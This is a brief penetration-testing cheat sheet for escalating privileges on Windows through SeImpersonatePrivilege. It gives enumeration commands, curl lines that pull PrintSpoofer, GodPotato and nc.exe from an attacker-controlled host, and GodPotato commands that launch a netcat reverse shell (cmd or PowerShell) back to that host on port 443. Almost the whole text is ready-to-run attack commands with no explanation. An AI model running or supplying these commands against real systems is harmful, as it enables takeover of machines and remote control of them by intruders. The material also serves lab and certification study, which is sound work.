# SeImpersonatePrivilege

## Enumeration

    Whoami /priv 
    Whoami /all

## Printspoofer


    curl 192.168.10.10/PrintSpoofer64.exe -o Pr.exe

    .\Pr.exe -i -c cmd OR .\PrintSpoofer32.exe -i -c powershell.exe

## GODPotato


    curl 192.168.10.10:8081/GodPotato-NET2.exe -o god.exe

    .\god.exe -cmd "cmd /c whoami" OR

    curl 192.168.10.10:8081/nc.exe -o nc.exe

    .\god.exe -cmd "cmd /c C:\xampp\htdocs\cms\files\nc.exe 192.168.10.10 443 -e cmd"

    .\god.exe -cmd "cmd /c C:\xampp\htdocs\cms\files\nc.exe 192.168.10.10 443 -e powershell"

